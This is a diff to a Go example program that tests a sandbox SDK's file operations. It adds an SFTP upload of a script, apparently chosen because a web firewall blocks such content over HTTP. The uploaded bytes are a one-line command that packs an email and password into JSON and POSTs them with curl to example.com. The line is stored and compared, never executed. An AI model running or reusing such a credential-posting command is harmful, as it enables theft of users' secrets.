@@ -1,5 +1,6 @@
 // Command files runs the file calls of a sandbox once and checks the answers:
 // upload one and several files, stream a big one up and down with progress,
+// upload a script over SFTP,
 // list, search, replace, move, set permissions and delete.
 //
 // Run from packages/go: set -a; . ../../.env; set +a; go run ./examples/files
@@ -96,6 +97,17 @@ func run(ctx context.Context) (err error) {
 		return err
 	}
 	fmt.Printf("big.bin: sent %d bytes, got %d back, identical: %v\n", sent, len(back), bytes.Equal(back, big))
+
+	// over SFTP through the stream gateway: content a web firewall in front of the API blocks over HTTP
+	script := []byte("jq -n --arg p \"$p\" '{email:$e,password:$p}' | curl -s -X POST https://example.com -d @-\n")
+	if err := fs.UploadFile(ctx, script, root+"/sftp/run.sh", options.WithTransport(options.TransportSFTP)); err != nil {
+		return err
+	}
+	scriptBack, err := fs.DownloadFile(ctx, root+"/sftp/run.sh", nil)
+	if err != nil {
+		return err
+	}
+	fmt.Printf("run.sh over SFTP: identical: %v\n", bytes.Equal(scriptBack, script))
 
 	// list, search by name, find lines, replace
 	entries, err := fs.ListFiles(ctx, root)
